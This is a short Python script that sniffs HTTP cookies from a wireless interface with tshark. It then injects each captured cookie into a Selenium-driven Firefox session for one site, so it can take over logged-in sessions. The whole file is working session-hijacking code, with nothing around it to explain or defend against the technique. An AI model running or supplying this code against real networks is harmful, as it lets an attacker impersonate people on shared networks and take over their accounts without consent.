import subprocess
import parser
from selenium import webdriver


def get_cookie():

    cmd = ['sudo', 'tshark', '-i', 'wlp4s0', '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie']

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pattern = {'name': '', 'value': '', 'path': '/'}

    while True:
        output = process.stdout.readline().decode('utf-8')

        if output == '' and process.poll() is not None:
            break

        if output:
            cookie = parser.parse(output)

            for k, v in cookie.items():
                pattern['name'] = k
                pattern['value'] = v
            print(pattern)
            driver = webdriver.Firefox()
            driver.get('http://mikolaj.ovh')
            driver.add_cookie(pattern)
            driver.get('http://mikolaj.ovh')
            

get_cookie()
